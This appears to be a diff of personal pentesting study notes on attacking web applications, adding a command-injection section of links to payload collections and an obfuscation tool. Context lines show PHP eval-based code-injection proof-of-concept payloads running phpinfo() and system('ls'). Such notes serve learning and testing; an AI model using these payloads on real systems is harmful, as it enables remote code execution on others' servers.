@@ -1,7 +1,7 @@
 ---
 title: "Web"
 date: 2023-01-03
-modified: 2023-01-04
+modified: 2023-03-03
 draft: false
 summary: "Attacking web applications."
 ---
@@ -23,3 +23,14 @@ POC: `?str=${eval($_GET[1])}&1=phpinfo();`
 For example: `GET /?format=${eval($_GET[1])}&1=system('ls');`
 
 [https://www.programmersought.com/article/30723400042/](https://www.programmersought.com/article/30723400042/)
+
+## Command injection
+
+### Characters
+
+See <https://academy.hackthebox.com/module/109/section/1032>
+
+### Resources
+
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
